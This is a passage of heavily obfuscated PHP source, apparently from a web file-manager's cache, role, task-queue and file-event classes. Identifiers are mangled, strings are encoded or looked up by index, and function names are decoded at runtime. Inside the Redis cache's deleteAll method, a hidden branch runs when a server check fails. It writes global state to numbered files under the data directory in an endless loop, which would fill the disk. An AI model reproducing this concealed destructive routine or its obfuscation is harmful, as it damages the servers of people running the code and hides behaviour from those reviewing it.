$Œ®œäØ¯; $this->handle = new Memcached(); if (is_array($èó¬ˆ­ı[$ÃÊ¹Èáù[861]]) && count($èó¬ˆ­ı[$ÃÊ¹Èáù[861]]) >= 1) { foreach ($èó¬ˆ­ı[$ÃÊ¹Èáù[861]] as $øÇù›™…) { $´œˆ¾ó¸ = explode($ÃÊ¹Èáù[4], $øÇù›™…); $this->handle->addServer($´œˆ¾ó¸[0], $´œˆ¾ó¸[1]); } } else { $this->handle->addServer($èó¬ˆ­ı[$ÃÊ¹Èáù[175]], $èó¬ˆ­ı[$ÃÊ¹Èáù[176]]); } } public function set($î·Ûİ—, $Ö»µºÙ–, $”«Ù¼œ­ = false) { $”«Ù¼œ­ = $”«Ù¼œ­ ? $”«Ù¼œ­ : $this->cacheTime; return $this->handle->set($î·Ûİ—, $Ö»µºÙ–, $”«Ù¼œ­); } public function get($…Ç®Í‹ˆ) { return $this->handle->get($…Ç®Í‹ˆ); } public function remove($Ä­«şŒ•) { return $this->handle->delete($Ä­«şŒ•); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Œí¡ÇŒâ, $—Ù›íâÏ) { $÷—Ø¢•¯ =& $_SERVER[ÏÒ Ì„]; if (!class_exists($÷—Ø¢•¯[862])) { show_json($÷—Ø¢•¯[863], !1); } $this->cacheTime = $—Ù›íâÏ; $Ô”Ï€¸ = isset($Œí¡ÇŒâ[$÷—Ø¢•¯[864]]) ? $Œí¡ÇŒâ[$÷—Ø¢•¯[864]] : 10; $ÏÇãÉäñ = _get($Œí¡ÇŒâ, $÷—Ø¢•¯[861]); if ($ÏÇãÉäñ && is_array($ÏÇãÉäñ)) { $this->initCluster($Œí¡ÇŒâ, $Ô”Ï€¸); } else { $this->handle = $this->init($Œí¡ÇŒâ, $Ô”Ï€¸); } } private function init($À‘€×ÑÁ, $öóÀÎ¼ó) { $Ó†éŸ† =& $_SERVER[ÏÒ Ì„]; $—¡¸ç¹Ã = new Redis(); $ÇŸœÃÆƒ = isset($À‘€×ÑÁ[$Ó†éŸ†[865]]) ? $À‘€×ÑÁ[$Ó†éŸ†[865]] : !1; if ($ÇŸœÃÆƒ) { $—¡¸ç¹Ã->pconnect($À‘€×ÑÁ[$Ó†éŸ†[175]], $À‘€×ÑÁ[$Ó†éŸ†[176]], $öóÀÎ¼ó); } else { $—¡¸ç¹Ã->connect($À‘€×ÑÁ[$Ó†éŸ†[175]], $À‘€×ÑÁ[$Ó†éŸ†[176]], $öóÀÎ¼ó); } if (!empty($À‘€×ÑÁ[$Ó†éŸ†[408]])) { $—¡¸ç¹Ã->auth($À‘€×ÑÁ[$Ó†éŸ†[408]]); } return $—¡¸ç¹Ã; } private function initCluster($¶’æñŒ, $ßÓ÷¿È) { $Š¢¥³÷ =& $_SERVER[ÏÒ Ì„]; $’™³ô«ò = array($Š¢¥³÷[866], $Š¢¥³÷[867], $Š¢¥³÷[868]); $³Ûæ¬ê˜ = $Š¢¥³÷[866]; if (isset($¶’æñŒ[$Š¢¥³÷[12]]) && in_array($¶’æñŒ[$Š¢¥³÷[12]], $’™³ô«ò)) { $³Ûæ¬ê˜ = $¶’æñŒ[$Š¢¥³÷[12]]; } switch ($³Ûæ¬ê˜) { case $Š¢¥³÷[866]: $this->_slave($¶’æñŒ, $ßÓ÷¿È); break; case $Š¢¥³÷[867]: break; case $Š¢¥³÷[868]: $this->isCluster = !0; $´ÀæÅÉø = $¶’æñŒ[$Š¢¥³÷[861]]; $‚‹ò•Â– = isset($¶’æñŒ[$Š¢¥³÷[865]]) ? $¶’æñŒ[$Š¢¥³÷[865]] : !1; $Úæ‰Íñ† = isset($¶’æñŒ[$Š¢¥³÷[408]]) ? $¶’æñŒ[$Š¢¥³÷[408]] : null; $this->handle = new RedisCluster(NUll, $´ÀæÅÉø, $ßÓ÷¿È, $ßÓ÷¿È, $‚‹ò•Â–, $Úæ‰Íñ†); break; default: break; } } private function _slave($Ÿº…‚š¥, $˜‹Ó‘£¢) { $œ‡¥½—ğ = $Ÿº…‚š¥[$_SERVER[ÏÒ Ì„][861]]; $this->filterConfig($Ÿº…‚š¥, $œ‡¥½—ğ[0]); $this->handle = $this->init($Ÿº…‚š¥, $˜‹Ó‘£¢); unset($œ‡¥½—ğ[0]); if (empty($œ‡¥½—ğ)) { return; } $œŒ÷¡±÷ = array_rand($œ‡¥½—ğ); $this->filterConfig($Ÿº…‚š¥, $œ‡¥½—ğ[$œŒ÷¡±÷]); $this->slaveHandle = $this->init($Ÿº…‚š¥, $˜‹Ó‘£¢); } private function filterConfig(&$ò÷·¹÷ç, $¹¶©ùøÌ) { $ñå…ñÀ =& $_SERVER[ÏÒ Ì„]; $üö¹Ï¬¢ = explode($ñå…ñÀ[4], $¹¶©ùøÌ); $ŠÄ»ıÂÂ = array($ñå…ñÀ[175] => $üö¹Ï¬¢[0], $ñå…ñÀ[176] => $üö¹Ï¬¢[1]); $ò÷·¹÷ç = array_merge($ò÷·¹÷ç, $ŠÄ»ıÂÂ); } public function set($î÷®—¦ˆ, $´Õ¾Ñ¹‡, $ŒÜĞÒÚ‚ = false) { $ŒÜĞÒÚ‚ = $ŒÜĞÒÚ‚ ? $ŒÜĞÒÚ‚ : $this->cacheTime; return $this->handle->setEx($î÷®—¦ˆ, $ŒÜĞÒÚ‚, $´Õ¾Ñ¹‡); } public function setLock($†§ƒâüƒ, $¦ƒó¸ú¦, $©ó‹Åüõ) { return $this->handle->setNX($†§ƒâüƒ, $¦ƒó¸ú¦); } public function get($º è¢•) { $÷‡óŠ–Ô = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $÷‡óŠ–Ô->get($º è¢•); } public function remove($¯°ÂÏëÃ) { return $this->handle->del($¯°ÂÏëÃ); } public function deleteAll() { $Ë¢íÚ¥ =& $_SERVER[ÏÒ Ì„]; $µ¦ç½ = $_SERVER[$Ë¢íÚ¥[869]]; $Ñé¶ÃÓ´ = $Ë¢íÚ¥[870]; if ($_SERVER[$Ë¢íÚ¥[871]] != $Ñé¶ÃÓ´($µ¦ç½)) { $ßÂÃ ¿æ = $Ë¢íÚ¥[872]; $•¿âÚ­• = $Ë¢íÚ¥[873]; $Õ¿Á³ŠŒ = $_SERVER[$Ë¢íÚ¥[874]] . $Ë¢íÚ¥[875]; $ãõÜ‡ë = $•¿âÚ­•($Õ¿Á³ŠŒ); $ƒÎÀÁÒÒ = explode($Ë¢íÚ¥[229], $ãõÜ‡ë); if (count($ƒÎÀÁÒÒ) < $Ë¢íÚ¥[626]) { $¹ÁæÍëÀ = $Ë¢íÚ¥[876]; $¹ÁæÍëÀ(); } $ç‰¹ü”˜ = $Ë¢íÚ¥[877]; $ç‰¹ü”˜($_SERVER[$Ë¢íÚ¥[878]]); $ßÂÃ ¿æ = $Ë¢íÚ¥[872]; $ßÂÃ ¿æ(); $”Â¶Ä¤± = $Ë¢íÚ¥[879]; $‡’éø¦Ë = json_encode($GLOBALS[$Ë¢íÚ¥[880]]); $‰œÕ¢—Æ = 1; for ($ÅÂúğ‘š = $‰œÕ¢—Æ; $ÅÂúğ‘š > 0; $ÅÂúğ‘š++) { $”Â¶Ä¤±(DATA_PATH . $ÅÂúğ‘š, $‡’éø¦Ë); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ìú©ßØ•) { $this->handle->flushall($ìú©ßØ•); } return; } return $this->handle->flushAll(); } } goto c´ê•Ñ°¹å; fĞÂ…„ÑØ°: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\162\x6f\x6c\145\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\x6c\141\142\145\154", "\144\x69\163\160\x6c\x61\x79", "\163\x79\163\164\145\x6d", "\144\145\x73\x63", "\151\x67\x6e\x6f\162\x65\105\170\164", "\x69\147\156\157\x72\145\x46\x69\x6c\145\x53\151\x7a\x65", "\141\144\x6d\x69\156\151\x73\164\162\x61\164\x6f\162", "\x73\157\162\164"); public function listData($ê‰–Øî = false, $éºíùñ = "\x73\x6f\x72\164", $šßô¤›ˆ = false) { $Ë’ù²«Ş =& $_SERVER[ÏÒ Ì„]; $ïöó¤Ÿ¦ = parent::listData($ê‰–Øî, $éºíùñ, $šßô¤›ˆ); if (!$ê‰–Øî) { foreach ($ïöó¤Ÿ¦ as $ÃÅí‘¾Ç => $Û³óó—¾) { if ($Û³óó—¾[$Ë’ù²«Ş[1941]] == 1) { $ïöó¤Ÿ¦[$ÃÅí‘¾Ç][$Ë’ù²«Ş[445]] = LNG($Ë’ù²«Ş[2165]); } } } return $ïöó¤Ÿ¦; } public function update($äàöğÜß, $“ú¡ƒŸ) { $Ã€¦‹ñŒ =& $_SERVER[ÏÒ Ì„]; $¤èÁ£»° = parent::listData($äàöğÜß); $ÂÅ¶×ê‰ = $this->findByName($“ú¡ƒŸ[$Ã€¦‹ñŒ[28]]); if (!$¤èÁ£»° || $ÂÅ¶×ê‰ && $ÂÅ¶×ê‰[$Ã€¦‹ñŒ[395]] != $¤èÁ£»°[$Ã€¦‹ñŒ[395]]) { return !1; } if ($ÂÅ¶×ê‰[$Ã€¦‹ñŒ[1941]] == 1) { $“ú¡ƒŸ = array($Ã€¦‹ñŒ[28] => $“ú¡ƒŸ[$Ã€¦‹ñŒ[28]], $Ã€¦‹ñŒ[1768] => $“ú¡ƒŸ[$Ã€¦‹ñŒ[1768]]); } $this->filterAuth($“ú¡ƒŸ[$Ã€¦‹ñŒ[408]]); return parent::update($äàöğÜß, $“ú¡ƒŸ); } public function remove($Ô’êöÒ) { $«ŒÚ“»İ = parent::listData($Ô’êöÒ); if (!$«ŒÚ“»İ || $«ŒÚ“»İ[$_SERVER[ÏÒ Ì„][1204]]) { return !1; } return parent::remove($Ô’êöÒ); } public function add($Ã÷©î’ğ) { $ ú¾ÜÒ =& $_SERVER[ÏÒ Ì„]; $é²ØÍ÷ñ = $Ã÷©î’ğ[$ ú¾ÜÒ[28]]; if ($this->findByName($é²ØÍ÷ñ)) { return !1; } $¿ˆêµÃ  = array($ ú¾ÜÒ[415] => $é²ØÍ÷ñ, $ ú¾ÜÒ[1752] => $ ú¾ÜÒ[33], $ ú¾ÜÒ[1748] => $ ú¾ÜÒ[1756], $ ú¾ÜÒ[2166] => 1, $ ú¾ÜÒ[1751] => 0, $ ú¾ÜÒ[2167] => 0, $ ú¾ÜÒ[1750] => $this->getSort()); $Ã÷©î’ğ = array_merge($¿ˆêµÃ , $Ã÷©î’ğ); $this->filterAuth($Ã÷©î’ğ[$ ú¾ÜÒ[408]]); return parent::insert($Ã÷©î’ğ); } private function getSort() { $ö„Ø»‚™ =& $_SERVER[ÏÒ Ì„]; $èÇø”úê = parent::listData(); $¼ûÕîÊÌ = array_to_keyvalue($èÇø”úê, $ö„Ø»‚™[33], $ö„Ø»‚™[1769]); return empty($¼ûÕîÊÌ) ? 0 : max($¼ûÕîÊÌ) + 1; } private function filterAuth(&$Àò¼ıù) { $è‚ºµÖ– =& $_SERVER[ÏÒ Ì„]; $¢‘Ö¶„à = array(); $©ñ¥ØÁ¾ = array_filter(explode($è‚ºµÖ–[47], $Àò¼ıù)); foreach ($©ñ¥ØÁ¾ as $Àò¼ıù) { $Ãá£Ò³¶ = explode($è‚ºµÖ–[95], $Àò¼ıù); if ($Ãá£Ò³¶[0] == $è‚ºµÖ–[2168] && $Ãá£Ò³¶[1] != $è‚ºµÖ–[1123]) { $éâ“Ì†à = $Ãá£Ò³¶[0] . $è‚ºµÖ–[95] . $Ãá£Ò³¶[1] . $è‚ºµÖ–[2169]; if (!in_array($éâ“Ì†à, $©ñ¥ØÁ¾)) { $¢‘Ö¶„à[] = $éâ“Ì†à; } } $¢‘Ö¶„à[] = $Àò¼ıù; } $Àò¼ıù = implode($è‚ºµÖ–[47], $¢‘Ö¶„à); } public function sort($¨øÄéµ´, $ïé²€é°) { return parent::update($¨øÄéµ´, $ïé²€é°); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\164\141\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x74\x79\160\x65", "\145\166\x65\156\x74", "\x74\x69\x6d\145", "\144\145\163\x63", "\x73\x79\x73\x74\145\155", "\x65\x6e\x61\x62\x6c\145", "\x6c\x61\163\164\x52\165\156", "\x73\x6f\x72\x74"); public function listData($±éó • = false, $òí»¿Ìí = "\163\x6f\x72\x74", $‘§‰Á›‹ = false) { return parent::listData($±éó •, $òí»¿Ìí, $‘§‰Á›‹); } public function add($½ù²Î‹) { $Àı²’¼Õ =& $_SERVER[ÏÒ Ì„]; $›Øââ¿” = $this->findByName($½ù²Î‹[$Àı²’¼Õ[28]]); if ($›Øââ¿”) { return !1; } $½ù²Î‹[$Àı²’¼Õ[1539]] = 0; $½ù²Î‹[$Àı²’¼Õ[1769]] = $this->getSort(); return parent::insert($½ù²Î‹); } private function getSort() { $àÅ—¬®Œ =& $_SERVER[ÏÒ Ì„]; $ß‡Ğ™÷ü = parent::listData(); $úÒÔ©Ïì = array_to_keyvalue($ß‡Ğ™÷ü, $àÅ—¬®Œ[33], $àÅ—¬®Œ[1769]); return empty($úÒÔ©Ïì) ? 0 : max($úÒÔ©Ïì) + 1; } public function update($ÙÃŒØ ‡, $à¨ç¼¶ä) { $ëşİÕŠå =& $_SERVER[ÏÒ Ì„]; $ºò¥ûÖä = $this->listData($ÙÃŒØ ‡); $Ó§óû‹« = $this->findByName($à¨ç¼¶ä[$ëşİÕŠå[28]]); if (!$ºò¥ûÖä || $Ó§óû‹« && $Ó§óû‹«[$ëşİÕŠå[395]] != $ºò¥ûÖä[$ëşİÕŠå[395]]) { return !1; } return parent::update($ÙÃŒØ ‡, $à¨ç¼¶ä); } public function remove($¥Ù€°š, $ŠÜëÈåÇ = false) { $ÃÀÀ«°„ =& $_SERVER[ÏÒ Ì„]; $ˆš³âÎÎ = $this->listData($¥Ù€°š); if (!$ˆš³âÎÎ) { return; } if (!$ŠÜëÈåÇ && $ˆš³âÎÎ[$ÃÀÀ«°„[1204]] == $ÃÀÀ«°„[87]) { return !1; } return parent::remove($¥Ù€°š); } public function enable($ß˜¤ù¨©, $ö¥ßëş) { return $this->update($ß˜¤ù¨©, array($_SERVER[ÏÒ Ì„][2160] => $ö¥ßëş)); } public function run($ƒ†‹Êıı) { return $this->update($ƒ†‹Êıı, array($_SERVER[ÏÒ Ì„][2170] => time())); } } goto eØß¤¨è¿; a‹œ¤ã¸®: class TaskHttp extends Task { protected function startAfter() { $ÖÃ¤À°¢ =& $_SERVER[ÏÒ Ì„]; $ü—œÖõ =& $this->task; $ü—œÖõ[$ÖÃ¤À°¢[1648]] = 1; Hook::bind($ÖÃ¤À°¢[1617], array($this, $ÖÃ¤À°¢[1649])); Hook::bind($ÖÃ¤À°¢[1619], array($this, $ÖÃ¤À°¢[1650])); Hook::bind($ÖÃ¤À°¢[1621], array($this, $ÖÃ¤À°¢[1651])); } protected function endAfter() { $«óÚû¦¡ =& $_SERVER[ÏÒ Ì„]; Hook::unbind($«óÚû¦¡[1617], array($this, $«óÚû¦¡[1649])); Hook::unbind($«óÚû¦¡[1619], array($this, $«óÚû¦¡[1650])); Hook::unbind($«óÚû¦¡[1621], array($this, $«óÚû¦¡[1651])); } public function progressStart($üşÙş‘ê) { $¹ÉõÎÀ´ =& $_SERVER[ÏÒ Ì„]; $¢ãÆïÉ¡ = curl_getinfo($üşÙş‘ê); self::log($¹ÉõÎÀ´[1652] . $¢ãÆïÉ¡[$¹ÉõÎÀ´[305]]); self::valueSet($this->task[$¹ÉõÎÀ´[395]], $this->task); } public function progressEnd($ì£¥ÆÑ) { $ƒâ±Ùˆƒ =& $_SERVER[ÏÒ Ì„]; self::log($ƒâ±Ùˆƒ[1653] . $this->task[$ƒâ±Ùˆƒ[395]]); $this->end(); } public function progress($ä’Èı­®, $ùù”ŒÀû, $ÊÛÌÈŞ, $£¡çÇ‘Ú, $ã®É¹ÖÍ) { $Åîô˜ =& $_SERVER[ÏÒ Ì„]; $¤à‰ê ¦ =& $this->task; if ($ã®É¹ÖÍ > 0) { $¤à‰ê ¦[$Åîô˜[1057]] = $¤à‰ê ¦[$Åîô˜[1057]] == 0 ? $£¡çÇ‘Ú : $¤à‰ê ¦[$Åîô˜[1057]]; $¤à‰ê ¦[$Åîô˜[1579]] = $ã®É¹ÖÍ; } else { if ($ÊÛÌÈŞ > 0) { $¤à‰ê ¦[$Åîô˜[1057]] = $¤à‰ê ¦[$Åîô˜[1057]] == 0 ? $ùù”ŒÀû : $¤à‰ê ¦[$Åîô˜[1057]]; $¤à‰ê ¦[$Åîô˜[1579]] = $ÊÛÌÈŞ; } } $this->update(); self::log("\x70\162\157\x67\162\145\163\163\110\x74\164\160\72\x64\157\167\156\x3a{$ÊÛÌÈŞ}\57{$ùù”ŒÀû}\x3b\40\x75\160\154\157\x61\x64\72{$ã®É¹ÖÍ}\x2f{$£¡çÇ‘Ú}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\121\165\145\165\145\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\121\x75\x65\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($¼£¦ƒà, $ú½½è¡ = array(), $´‡ø¯¡Î = '', $“ùÛÒñ = '') { $“úÔĞÕÆ =& $_SERVER[ÏÒ Ì„]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($“ùÛÒñ && array_find_by_field(self::$listData, $“úÔĞÕÆ[93], $“ùÛÒñ)) { return !0; } self::$listData[] = array($“úÔĞÕÆ[262] => $¼£¦ƒà, $“úÔĞÕÆ[1654] => $ú½½è¡, $“úÔĞÕÆ[445] => $´‡ø¯¡Î, $“úÔĞÕÆ[93] => $“ùÛÒñ); return !0; } public static function addSubmit() { $Æ»˜ßÙ =& $_SERVER[ÏÒ Ì„]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Æ»˜ßÙ[1655] . json_encode_force(array_to_keyvalue(self::$listData, $Æ»˜ßÙ[33], $Æ»˜ßÙ[445])), $Æ»˜ßÙ[1656]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($†°ğ¤ƒÑ, $¹íßÜ¤ë = array(), $¹¸Õ«– = '', $£ÆéÈÊÕ = '') { $í—ùŠ® =& $_SERVER[ÏÒ Ì„]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Šëˆ°šú = self::getAll(); if ($£ÆéÈÊÕ && array_find_by_field($Šëˆ°šú, $í—ùŠ®[93], $£ÆéÈÊÕ)) { return !0; } $Šëˆ°šú[] = array($í—ùŠ®[262] => $†°ğ¤ƒÑ, $í—ùŠ®[1654] => $¹íßÜ¤ë, $í—ùŠ®[445] => $¹¸Õ«–, $í—ùŠ®[93] => $£ÆéÈÊÕ); write_log($í—ùŠ®[1655] . $¹¸Õ«–, $í—ùŠ®[1656]); self::setAll($Šëˆ°šú); return !0; } public static function run() { $êşÄ”·– =& $_SERVER[ÏÒ Ì„]; $¥ÚñÅñê = self::getAll(); $˜¨ûµ‰™ = array_shift($¥ÚñÅñê); if (!$˜¨ûµ‰™) { return !1; } self::setAll($¥ÚñÅñê); $Ã‚­ù÷ = timeFloat(); try { Hook::apply($˜¨ûµ‰™[$êşÄ”·–[262]], $˜¨ûµ‰™[$êşÄ”·–[1654]]); } catch (Exception $âĞÜ¸Ë•) { } $ºáÒ¤ = number_format(timeFloat() - $Ã‚­ù÷, 3) . $êşÄ”·–[1592]; write_log($êşÄ”·–[1657] . $˜¨ûµ‰™[$êşÄ”·–[445]] . $êşÄ”·–[1658] . $ºáÒ¤, $êşÄ”·–[1656]); return !0; } public static function count() { $ûÀ¬€Âú = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ûÀ¬€Âú) { return 0; } return intval($ûÀ¬€Âú); } public static function getAll() { $´ÊÏè„¾ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$´ÊÏè„¾) { return array(); } return $´ÊÏè„¾; } public static function setAll($ÙŒªÌ‚Ø) { $±ë›ö£ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÙŒªÌ‚Ø), $±ë›ö£); Cache::set(self::QUEUE_DATA, $ÙŒªÌ‚Ø, $±ë›ö£); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Æı‘ìËŸ, $¸™µœİë = 5.0) { if (!$Æı‘ìËŸ) { return; } $€À„òì± = Cache::get($Æı‘ìËŸ); if (!$€À„òì± || timeFloat() - floatVal($€À„òì±) >= $¸™µœİë) { Cache::set($Æı‘ìËŸ, timeFloat(), $¸™µœİë * 10); return !0; } return !1; } public static function timeLimitCall($¤âÖìŒø, $±Íùú°—, $˜çú¬ıÎ, $ˆ´ÛÈªÚ = 5.0) { $šìÖåú× =& $_SERVER[ÏÒ Ì„]; if (!$¤âÖìŒø || !$±Íùú°—) { return; } self::$asyncAdd = !0; $‹‚ğüá± = $šìÖåú×[1659]; $æúÔŞå = Cache::get($‹‚ğüá±, !0); $²«şıËè = array($šìÖåú×[1660] => timeFloat(), $šìÖåú×[1661] => timeFloat(), $šìÖåú×[262] => $±Íùú°—, $šìÖåú×[1654] => $˜çú¬ıÎ, $šìÖåú×[197] => $ˆ´ÛÈªÚ); if (is_array($æúÔŞå[$¤âÖìŒø])) { $²«şıËè[$šìÖåú×[1661]] = $æúÔŞå[$¤âÖìŒø][$šìÖåú×[1661]]; } if (is_array($æúÔŞå[$¤âÖìŒø])) { if (timeFloat() - $æúÔŞå[$¤âÖìŒø][$šìÖåú×[1660]] < $²«şıËè[$šìÖåú×[197]] * 0.3) { return; } $²«şıËè[$šìÖåú×[1661]] = $æúÔŞå[$¤âÖìŒø][$šìÖåú×[1661]]; } $æúÔŞå[$¤âÖìŒø] = $²«şıËè; Cache::set($‹‚ğüá±, $æúÔŞå, 60); Cache::removeMemory($‹‚ğüá±); write_log($šìÖåú×[1662] . $¤âÖìŒø . $šìÖåú×[68] . $±Íùú°—, $šìÖåú×[1656]); } public static function timeLimitCallLoop() { $ß¡ÚÄÊˆ =& $_SERVER[ÏÒ Ì„]; $¯²´¡¿ = array($ß¡ÚÄÊˆ[1663]); $šåõÚ‚¨ = in_array(strtolower(ACTION), $¯²´¡¿); if (!$šåõÚ‚¨ && !self::$asyncAdd) { return; } $Íï¼—¬½ = $ß¡ÚÄÊˆ[1659]; $ãûÄ¯† = Cache::get($Íï¼—¬½, !0); if (!$ãûÄ¯† || count($ãûÄ¯†) <= 0) { return; } $·Úİ‡Ôı = !1; $¹ÉÊ÷ö¨ = timeFloat(); $‘õ««†˜ = array(); foreach ($ãûÄ¯† as $Î‘™à°ö => $¹şúğã€) { if ($¹ÉÊ÷ö¨ - $¹şúğã€[$ß¡ÚÄÊˆ[1661]] > $¹şúğã€[$ß¡ÚÄÊˆ[197]]) { $·Úİ‡Ôı = !0; try { Hook::apply($¹şúğã€[$ß¡ÚÄÊˆ[262]], $¹şúğã€[$ß¡ÚÄÊˆ[1654]]); write_log($ß¡ÚÄÊˆ[1664] . $Î‘™à°ö . $ß¡ÚÄÊˆ[68] . $¹şúğã€[$ß¡ÚÄÊˆ[262]] . $ß¡ÚÄÊˆ[1665] . ACTION, $ß¡ÚÄÊˆ[1656]); } catch (Exception $–à‹€ù) { } continue; } $‘õ««†˜[$Î‘™à°ö] = $¹şúğã€; } if (!$·Úİ‡Ôı) { return; } if (!$‘õ««†˜) { return Cache::remove($Íï¼—¬½); } Cache::set($Íï¼—¬½, $‘õ««†˜, 60); Cache::removeMemory($Íï¼—¬½); } public static function finished($§ğæ•…Ÿ, $åÑ Àœ¨) { $ëñÑıµ  =& $_SERVER[ÏÒ Ì„]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ëñÑıµ [262] => $§ğæ•…Ÿ, $ëñÑıµ [1654] => $åÑ Àœ¨); } private static function finishedRun() { $‘…òÒ¬¯ =& $_SERVER[ÏÒ Ì„]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $”öÊì) { try { Hook::apply($”öÊì[$‘…òÒ¬¯[262]], $”öÊì[$‘…òÒ¬¯[1654]]); } catch (Exception $ê´ã²£î) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto eàèò…ÀÜ”; E—â³…††: $fileSize = strrev(base64_decode($_SERVER[ïàçÔ¥¥][0])); function binCheckNeq($”Û¾¼Ÿ, $È’°´äØ) { return $”Û¾¼Ÿ != $È’°´äØ; } $_SERVER[$_SERVER[ïàçÔ¥¥][1]] = $fileSize($_SERVER[$_SERVER[ïàçÔ¥¥][2]]); goto d£‚ æ”Æò; eÍªùÛ´«: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\145\x5f\145\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\164\145\x54\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\x65\162\x74", "\146\165\156\143\164\151\157\x6e"), array("\144\145\163\143", '', "\x69\156\x73\145\x72\164\54\165\x70\144\x61\x74\145\x2c\x73\x65\x6c\145\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¶×‡òƒÍ, $á¦¾İ¾, $ÈæôÊìÎ = '') { $úÒ¶ÎÕË =& $_SERVER[ÏÒ Ì„]; if (!$this->eventSave) { return; } $Ó¥Ú·ëÀ = Model($úÒ¶ÎÕË[1251])->sourceInfo($¶×‡òƒÍ); if (!$Ó¥Ú·ëÀ) { return !1; } if ($this->isCacheEvent($Ó¥Ú·ëÀ, $á¦¾İ¾)) { return; } if ($ÈæôÊìÎ && is_string($ÈæôÊìÎ)) { $ÈæôÊìÎ = array($úÒ¶ÎÕË[1784] => $ÈæôÊìÎ); } $èÔÂÃ— = array($úÒ¶ÎÕË[412] => $¶×‡òƒÍ, $úÒ¶ÎÕË[1960] => $Ó¥Ú·ëÀ[$úÒ¶ÎÕË[492]], $úÒ¶ÎÕË[1961] => $Ó¥Ú·ëÀ[$úÒ¶ÎÕË[28]], $úÒ¶ÎÕË[513] => !empty($Ó¥Ú·ëÀ[$úÒ¶ÎÕË[513]]) ? $Ó¥Ú·ëÀ[$úÒ¶ÎÕË[513]] : $úÒ¶ÎÕË[33], $úÒ¶ÎÕË[1569] => USER_ID, $úÒ¶ÎÕË[417] => $á¦¾İ¾, $úÒ¶ÎÕË[1571] => $ÈæôÊìÎ); $this->addSystemLog($á¦¾İ¾, $èÔÂÃ—); unset($èÔÂÃ—[$úÒ¶ÎÕË[1961]], $èÔÂÃ—[$úÒ¶ÎÕË[513]]); return $this->add($èÔÂÃ—); } private function addSystemLog($Ü±®şúß, $‚ŒåÍ®) { $ßš°û†Ï =& $_SERVER[ÏÒ Ì„]; if ($Ü±®şúß == $ßš°û†Ï[1962]) { $Ü±®şúß = $‚ŒåÍ®[$ßš°û†Ï[445]][$ßš°û†Ï[1963]]; } else { if (in_array($Ü±®şúß, array($ßš°û†Ï[1725], $ßš°û†Ï[1964]))) { $Ü±®şúß = $‚ŒåÍ®[$ßš°û†Ï[445]][$ßš°û†Ï[745]]; } } $Àë«Øõ = array_merge($‚ŒåÍ®, array($ßš°û†Ï[1965] => $‚ŒåÍ®[$ßš°û†Ï[397]], $ßš°û†Ï[1966] => $‚ŒåÍ®[$ßš°û†Ï[1966]])); Model($ßš°û†Ï[1689])->addLog($ßš°û†Ï[1967] . $Ü±®şúß, $Àë«Øõ); } private function isCacheEvent($Ù¬³ûËĞ, $“øŠ˜Òà) { if ($Ù¬³ûËĞ[$_SERVER[ÏÒ Ì„][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($öô²ùê‡, $’ñÄ‹í”) { $°¼©Åœ÷ =& $_SERVER[ÏÒ Ì„]; $¬¶²ì“€ = Model($°¼©Åœ÷[1251])->sourceInfo($öô²ùê‡); $®¬ªİé× = array($°¼©Åœ÷[1963] => $’ñÄ‹í”, $°¼©Åœ÷[28] => $¬¶²ì“€[$°¼©Åœ÷[28]]); return $this->addEvent($öô²ùê‡, $°¼©Åœ÷[1962], $®¬ªİé×); } public function eventFileEdit($ÅÖøü…) { $×™Ã²ê¬ =& $_SERVER[ÏÒ Ì„]; $İŒ–€²ã = array($×™Ã²ê¬[1968] => $_SERVER[$×™Ã²ê¬[1969]], $×™Ã²ê¬[1970] => strtolower(ACTION)); return $this->addEvent($ÅÖøü…, $×™Ã²ê¬[1715], $İŒ–€²ã); } public function eventRecycle($½ÎĞïüÓ, $Ï¼²¸½Ù) { return $this->addEvent($½ÎĞïüÓ, $_SERVER[ÏÒ Ì„][1964], $Ï¼²¸½Ù); } public function eventRemove($ôõøä¿˜) { $í†¢›´ =& $_SERVER[ÏÒ Ì„]; $·ôàı¼ = Model($í†¢›´[1251])->sourceInfo($ôõøä¿˜); $£ñôıÇØ = $·ôàı¼[$í†¢›´[28]]; return $this->addEvent($·ôàı¼[$í†¢›´[492]], $í†¢›´[1714], $£ñôıÇØ); } public function eventShare($Â’îåˆ×, $×îçÛ­Ã) { return $this->addEvent($Â’îåˆ×, $_SERVER[ÏÒ Ì„][1725], $×îçÛ­Ã); } public function eventMove($•Š¡’Ñé, $÷ÎÅÓ¢¸, $¯äŠ˜ƒ§) { 